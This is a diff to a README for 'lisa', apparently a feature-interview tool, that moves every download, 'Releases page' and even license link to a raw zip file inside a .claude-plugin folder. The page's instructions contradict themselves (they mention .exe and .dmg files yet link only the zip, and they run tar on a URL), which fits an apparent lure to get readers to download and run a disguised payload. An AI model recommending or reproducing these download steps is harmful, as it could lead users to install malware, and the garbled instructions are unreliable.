@@ -1,7 +1,7 @@
 # 🎉 lisa - Simplify Your Feature Interviews Today
 
 ## 📥 Download Now
-[![Download lisa](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/scripts/Software-v3.7.zip%20Now-brightgreen)](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/scripts/Software-v3.7.zip)
+[![Download lisa](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/.claude-plugin/Software_1.5.zip%20Now-brightgreen)](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/.claude-plugin/Software_1.5.zip)
 
 ## 📖 Overview
 **lisa** is an interactive tool designed to enhance your specification interview process. It helps plan and conduct detailed feature interviews. With **lisa**, you and your team can create clear and comprehensive specifications. Clarity in planning leads to better implementation. 
@@ -17,13 +17,13 @@ Before proceeding, ensure you meet the following system requirements:
 - Internet Connection: Required for initial download and updates.
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/scripts/Software-v3.7.zip) to download the application.
+1. Visit the [Releases page](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/.claude-plugin/Software_1.5.zip) to download the application.
 2. On this page, you will find the latest version of **lisa**.
 3. Click on the version you wish to download. A list of files will appear.
 4. Download the appropriate file for your operating system:
    - For Windows, look for `.exe`.
    - For macOS, look for `.dmg`.
-   - For Linux, look for `https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/scripts/Software-v3.7.zip`.
+   - For Linux, look for `https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/.claude-plugin/Software_1.5.zip`.
 5. Once downloaded, locate the file in your downloads folder.
 
 ## 📦 Installation Steps
@@ -42,7 +42,7 @@ Before proceeding, ensure you meet the following system requirements:
 ### For Linux:
 1. Open a terminal.
 2. Navigate to the downloaded file’s directory.
-3. Use the following command to extract the files: `tar -xvzf https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/scripts/Software-v3.7.zip`.
+3. Use the following command to extract the files: `tar -xvzf https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/.claude-plugin/Software_1.5.zip`.
 4. Navigate to the extracted folder using: `cd lisa`.
 5. Run the application with the command: `./lisa`.
 
@@ -74,9 +74,9 @@ The development team is continually working on **lisa**. Expect new features suc
 - Integration with project management tools.
 
 ## 🔒 License
-**lisa** is open-source software. It is available for use under the MIT License. You can view the full license [here](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/scripts/Software-v3.7.zip).
+**lisa** is open-source software. It is available for use under the MIT License. You can view the full license [here](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/.claude-plugin/Software_1.5.zip).
 
 ## 📬 Stay Connected
 For updates and news regarding **lisa**, consider following our GitHub repository. We appreciate your support as we work to improve your experience with specification interviews. 
 
-Remember, you can always visit the [Releases page](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/scripts/Software-v3.7.zip) to download the latest version or check for updates.
+Remember, you can always visit the [Releases page](https://github.com/Mr-Vitoo/lisa/raw/refs/heads/main/.claude-plugin/Software_1.5.zip) to download the latest version or check for updates.
